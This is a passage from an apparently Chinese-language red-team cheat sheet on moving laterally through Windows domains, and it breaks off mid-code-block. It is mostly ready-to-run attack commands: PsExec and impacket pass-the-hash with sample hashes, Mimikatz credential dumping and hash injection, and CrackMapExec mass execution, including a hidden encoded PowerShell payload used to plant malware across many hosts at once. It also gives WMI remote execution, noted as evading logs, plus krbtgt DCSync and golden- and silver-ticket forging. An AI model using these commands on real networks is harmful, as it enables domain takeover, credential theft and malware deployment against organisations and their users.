&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;.\PsExec.exe \\192.168.10.201 -u domainname\username -p password -s cmd.exe -acceptcula
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;-accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框
-u：用户名
-p：密码
-s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个连接所用用户权限的shell&lt;/p&gt;
&lt;h3 id=&#34;pth-哈希传递&#34;&gt;PTH-哈希传递&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;利用条件&lt;/p&gt;
&lt;p&gt;1、在工作组环境中：&lt;/p&gt;
&lt;p&gt;Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。&lt;/p&gt;
&lt;p&gt;Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问&lt;/p&gt;
&lt;p&gt;2、在域环境中：&lt;/p&gt;
&lt;p&gt;只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器&lt;/p&gt;
&lt;p&gt;如果要用普通域管理员账号进行哈希传递攻击，则需要修改修改目标机器的 LocalAccountTokenFilterPolicy为1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;psexecpy-pth&#34;&gt;psexec.py-PTH&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;与官方psexec.exe相比会自动删除服务，增加隐蔽性&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py&#34;&gt;https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里推荐使用impacket套装,有exe和py版本&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;psexec.exe domain/username@10.73.147.30 -hashes 624aac413795cdc1a5c7b1e00f780017:852a844adfce18f66009b4f14e0a98de
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后会弹回一个system权限的交互shell。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python psexec.py  administrator@10.73.147.29   -hashes 624aac413795cdc1a5c7b1e00f780017:852a844adfce18f66009b4f14e0a98de
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这种方式方便我们直接通过代理在自己本机执行(py测试2003,但exe可以成功)&lt;/p&gt;
&lt;h4 id=&#34;smbexecpy&#34;&gt;smbexec.py&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py&#34;&gt;https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py&lt;/a&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python smbexec.py ./:@192.168.52.136
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;wmiexecpy-pth&#34;&gt;wmiexec.py-PTH&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py&#34;&gt;https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py&lt;/a&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python wmiexec.py -hashes 624aac413795cdc1a5c7b1e00f780017:852a844adfce18f66009b4f14e0a98de administrator@10.73.147.29
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;mimikatz-pth&#34;&gt;MiMiKatz-PTH&lt;/h4&gt;
&lt;p&gt;这个需要本地管理员权限(由Mimikatz的实现机制决定的)&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;privilege::debug
sekurlsa::logonpasswords
//抓取本机hash

privilege::debug
sekurlsa::pth /user:administrator /domain:workgroup /ntlm:852a844adfce18f66009b4f14e0a98de
//将获取的Hash添加进lsass中
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，访问远程主机或服务，就不用提供明文密码了。
我们可以通过copy文件，然后执行计划任务去拿到shell(这个思路有自动化实现的工具)。&lt;/p&gt;
&lt;h4 id=&#34;pth批量横向移动&#34;&gt;pth批量横向移动&lt;/h4&gt;
&lt;p&gt;CrackMapExec：https://github.com/byt3bl33d3r/CrackMapExec/&lt;/p&gt;
&lt;p&gt;CME集成了wmiexec、atexe、smbexec的方式,集成了smb扫描,口令爆破等功能,非常适合拿来快速移动。&lt;/p&gt;
&lt;p&gt;用cme来进行网段的smb扫描确定目标系统和smb服务&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cme smb 192.168.0.0/24 -t 255
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;批量传递hash:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cme smb 10.73.147.90 10.73.147.88 -u administrator -H 852a844adfce18f66009b4f14e0a98de
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;批量执行命令:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cme smb 10.73.147.90 10.73.147.88 -u administrator -H 852a844adfce18f66009b4f14e0a98de  -x &amp;quot;whoami&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者执行powershell,我们可以通过CS的powershell command然后粘贴生成的payload.txt中的内容直接-x执行即可批量上马。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cme smb 10.211.55.51  10.211.55.52 -u administrator  -H 852a844adfce18f66009b4f14e0a98de -x &amp;quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0...&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;wmi-横向&#34;&gt;WMI 横向&lt;/h2&gt;
&lt;p&gt;WMI的全名为“Windows Management Instrumentation”。从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以通过/node选项使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“自从PsExec在内网中被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单，于是攻击者逐渐开始使用WMI进行横向移动。通过渗透测试发现，在使用wmiexec进行横向移动时，Windows操作系统默认不会将WMI的操作记录在日志中，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。因为在这个过程中不会产生日志，所以，对网络管理员来说增加了攻击溯源的成本。而对攻击者来说，其恶意行为被发现的可能性有所降低、隐蔽性有所提高。由此，越来越多的APT开始使用WMI进行攻击，利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;使用条件&lt;/p&gt;
&lt;p&gt;1、WMI服务开启，端口135，默认开启。&lt;/p&gt;
&lt;p&gt;2、防火墙允许135、445等端口通信。&lt;/p&gt;
&lt;p&gt;3、知道目标机的账户密码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;执行命令：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic /node:191.168.52.136 /user:xxxx /password:xxxxx  process call create &amp;quot;cmd.exe /c ipconfig&amp;gt;d:\result.txt&amp;quot;
//无需上传第三方软件，利用系统内置程序,单命令执行，执行后无结果回显
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;wmi常用命令&#34;&gt;WMI常用命令&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/246440.html&#34;&gt;https://www.freebuf.com/articles/246440.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;文件管理&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic fsdir where &amp;quot;drive=&#39;c:&#39; and filename=&#39;whoami&#39;&amp;quot; list

wmic fsdir &amp;quot;c:\\test&amp;quot; call delete
//删除C盘下的test目录，注意“\”要进行一下转义

wmic process where “NOT ExecutablePath LIKE ‘%Windows%’” GET ExecutablePath
//枚举出整个系统中的所有可执行文件

for /f &amp;quot;skip=1 tokens=1*&amp;quot; %i in (&#39;wmic datafile where &amp;quot;FileName=&#39;qq&#39; and extension=&#39;exe&#39;&amp;quot; get drive^,path&#39;) do (set &amp;quot;qPath=%i%j&amp;quot;&amp;amp;@echo %qPath:~0,-3%)
//wmic 全盘搜索某文件并获取该文件所在目录

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;环境变量&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic environment get Description, VariableValue

wmic environment where &amp;quot;name=&#39;temp&#39;&amp;quot; get UserName,VariableValue
//环境变量，获取temp环境变量

wmic environment where &amp;quot;name=&#39;path&#39; and username=&#39;&amp;lt;system&amp;gt;&#39;&amp;quot; set VariableValue=&amp;quot;%path%;c:\whoami&amp;quot;
//更改PATH环境变量值，新增c:\whoami
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;进程管理&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic process list brief
//列出所有进程信息

wmic process get processid,name,executablepath 
//Full显示所有、Brief显示摘要、Instance显示实例、Status显示状态

wmic process where name=&amp;quot;vmtoolsd.exe&amp;quot; get executablepath
//获取指定进程可执行文件的路径

wmic process call create &amp;quot;C:\windows\system32\notepad.exe&amp;quot;
//创建进程

wmic process call create &amp;quot;cmd.exe /c &#39;ipconfig&#39;&amp;quot;
wmic process call create &amp;quot;shutdown.exe -r -f -t 60&amp;quot;
//根据系统命令创建进程

wmic process where name=&amp;quot;notepad.exe&amp;quot; delete
wmic process where pid=&amp;quot;244&amp;quot; delete 
//删除进程

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;用户账户管理&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic useraccount
wmic useraccount list brief

wmic useraccount where &amp;quot;name=&#39;%UserName%&#39;&amp;quot; call rename newUserName
// 更改当前用户名
wmic useraccount where &amp;quot;name=&#39;Administrator&#39;&amp;quot; call Rename admin
// 更改指定用户名
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获取补丁信息&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic qfe list brief
wmic qfe get Caption,Description,HotFixID,IntsalledOn
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看域控制器&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic ntdomain list brief
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看安装的软件信息&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic product get name,version
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;远程桌面连接
使用WMIC命令开启远程计算机的远程桌面连接：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;wmic /node:192.168.52.138 /USER:administrator PATH win32_terminalservicesetting WHERE (__Class!=&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;) CALL SetAllowTSConnections 1
// wmic /node:&lt;span class=&#34;s2&#34;&gt;&amp;#34;[full machine name]&amp;#34;&lt;/span&gt; /USER:&lt;span class=&#34;s2&#34;&gt;&amp;#34;[domain]\[username]&amp;#34;&lt;/span&gt; PATH win32_terminalservicesetting WHERE (__Class!=&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;) CALL SetAllowTSConnections 1
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;共享管理&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;wmic share list brief
wmic share get name,path,status

wmic share call create &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;TestShareName&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;c:\whoami&amp;#34;&lt;/span&gt;,0
&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;可使用 WMIC SHARE CALL Create /? 查看create后的参数类型&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
// 建立共享

wmic share where &lt;span class=&#34;s2&#34;&gt;&amp;#34;name=&amp;#39;C$&amp;#39;&amp;#34;&lt;/span&gt; call delete
wmic share where &lt;span class=&#34;s2&#34;&gt;&amp;#34;path=&amp;#39;c:\test&amp;#39;&amp;#34;&lt;/span&gt; delete
// 删除共享
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;wmiexec&#34;&gt;wmiexec&lt;/h3&gt;
&lt;p&gt;要执行命令并回显请使用wmiexec.py，⽤445端口传回显：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;python wmiexec.py administrator:Liu78963@192.168.183.130
// python wmiexec.py 用户名:密码@目标IP
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;指定-hashes选项的话，则可进行哈希传递。&lt;/p&gt;
&lt;p&gt;exe版本命令与wmiexec.py一模一样。在跳板机上上传wmiexec.exe并运行如下命令获取目标系统192.168.52.138的shell：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;wmiexec.exe administrator:Liu78963@192.168.183.130
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;wmiexecvbs&#34;&gt;wmiexec.vbs&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs&#34;&gt;https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;wmiexec.vbs脚本通过VBS调用WMI来模拟PsExec的功能。其可以在远程系统中执行命令并进行回显，获取远程主机的半交互式Shell。&lt;/p&gt;
&lt;p&gt;wmiexec.vbs支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。&lt;/p&gt;
&lt;h2 id=&#34;ptk-密钥传递&#34;&gt;PTK-密钥传递&lt;/h2&gt;
&lt;p&gt;即 Pass The Key ，当系统安装了 KB2871997 补丁且禁用了 NTLM 的时候，那我们抓取到的 ntlm hash. 也就失去了作用，但是可以通过 pass the key 的攻击方式获得权限。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;利用条件&lt;/p&gt;
&lt;p&gt;1、目标主机打过KB2871997&lt;/p&gt;
&lt;p&gt;2、所以必须使用SID值为500的用户&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;mimikatz sekurlsa::ekeys
//获取用户的aes key
sekurlsa::pth /user:xxx /domain:xxx /aes256:xxxxxxxx&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
//注入aes key，成功后会返回一个cmd
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ptt-票据传递&#34;&gt;PTT-票据传递&lt;/h2&gt;
&lt;h3 id=&#34;ms14-068&#34;&gt;MS14-068&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;利用条件&lt;/p&gt;
&lt;p&gt;1.域控没有打MS14-068的补丁(KB3011780)&lt;/p&gt;
&lt;p&gt;2.拿下一台加入域的计算机，并且能dump出某一域成员的用户名，密码，SID等值&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;域用户hack在域成员主机A上登录过，域成员主机A的管理员通过&lt;code&gt;mimikatz&lt;/code&gt;得到了域用户hack的用户名，密码，SID等值，而且域控存在&lt;code&gt;MS14-068&lt;/code&gt;漏洞，现在域成员主机A想通过&lt;code&gt;MS14-068&lt;/code&gt;漏洞访问域控。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068&#34;&gt;https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/-mo-/p/11890539.html&#34;&gt;https://www.cnblogs.com/-mo-/p/11890539.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/yuzly/p/10859520.html&#34;&gt;https://www.cnblogs.com/yuzly/p/10859520.html&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;黄金票据&#34;&gt;黄金票据&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;利用条件&lt;/p&gt;
&lt;p&gt;1.域名称&lt;/p&gt;
&lt;p&gt;2.域的SID值&lt;/p&gt;
&lt;p&gt;3.域的KRBTGT账户密码HASH（通常需要SYSTEM权限才能dump）&lt;/p&gt;
&lt;p&gt;4.伪造用户名，可以是任意的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;kerberos协议原理参考&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_41874930/article/details/108124366&#34;&gt;NTML认证与kerberos认证与PAC相关知识&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202206141128058.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。&lt;/p&gt;
&lt;p&gt;首先获取krbtgt的用户hash:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;mimikatz &lt;span class=&#34;s2&#34;&gt;&amp;#34;lsadump::dcsync /domain:xx.com /user:krbtgt&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi


kerberos::ptt test.kiribi #导入刚才生成的票据


&lt;span class=&#34;k&#34;&gt;dir&lt;/span&gt; \\dc.abc.com\c$  #导入成功后可获取域管权限
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;白银票据&#34;&gt;白银票据&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;利用条件&lt;/p&gt;
&lt;p&gt;1.域名称&lt;/p&gt;
&lt;p&gt;2.域的SID值&lt;/p&gt;
&lt;p&gt;3.域中的Server服务器账户的NTLM-Hash&lt;/p&gt;
&lt;p&gt;4.伪造的用户名，可以是任意用户名.&lt;/p&gt;
&lt;p&gt;5.目标服务器上面需要访问的kerberos服务&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202206141131526.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以伪造的服务&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;服务名称&lt;/th&gt;
&lt;th&gt;同时需要的服务&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;WMI&lt;/td&gt;
&lt;td&gt;HOST RPCSS&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PowerShell Remoting&lt;/td&gt;
&lt;td&gt;HOST HTTP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;WinRM&lt;/td&gt;
&lt;td&gt;HOST HTTP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Scheduled Tasks&lt;/td&gt;
&lt;td&gt;HOST&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Windows File Share (CIFS)&lt;/td&gt;
&lt;td&gt;CIFS&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;LDAP operations includingMimikatz DCSync&lt;/td&gt;
&lt;td&gt;LDAP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Windows Remote Server Administration Tools&lt;/td&gt;
&lt;td&gt;RPCSS LDAP CIFS&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;服务说明：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Silver Ticket连接到具有管理员权限Windows计算机上的WMI
为“ HOST ”服务和“ rpcss ”服务创建白银票据以使用WMI在目标系统上远程执行命令。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行&lt;/p&gt;
&lt;p&gt;为“ http ”服务和“ wsman ”服务创建Silver Ticket，以获得目标系统上的WinRM和或PowerShell Remoting的管理权限。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;具有管理员权限的Windows计算机（HOST）的Silver Ticket&lt;/p&gt;
&lt;p&gt;创建银票以获得目标计算机上所涵盖的任何Windows服务的管理员权限。这包括修改和创建计划任务的权限。&lt;/p&gt;
&lt;p&gt;注入两张HTTP＆WSMAN白银票据后，我们可以使用PowerShell远程（或WinRM的）反弹出目标系统shell。首先New-PSSession使用PowerShell创建到远程系统的会话的PowerShell cmdlet，然后Enter-PSSession打开远程shell。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Windows共享（CIFS）管理访问的Silver Ticket&lt;/p&gt;
&lt;p&gt;为 “cifs ”服务创建白银票据，以获得目标计算机上任何Windows共享的管理权限。&lt;/p&gt;
&lt;p&gt;注入CIFS Silver Ticket后，我们现在可以访问目标计算机上的任何共享，包括&lt;code&gt;c$&lt;/code&gt;共享，我们能够将文件拷贝到共享文件中。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Silver Ticket连接到具有管理员权限Windows计算机上的LDAP
为&amp;quot;ldap&amp;quot;服务创建Silver Ticket 以获得目标系统（包括Active Directory）上LDAP服务的管理权限。&lt;/p&gt;
&lt;p&gt;利用LDAP Silver Ticket，我们可以远程访问LDAP服务来获得krbtgt的信息&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;步骤(伪造CIFS的白银票据)：&lt;/p&gt;
&lt;p&gt;1.获取hash sid等信息&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
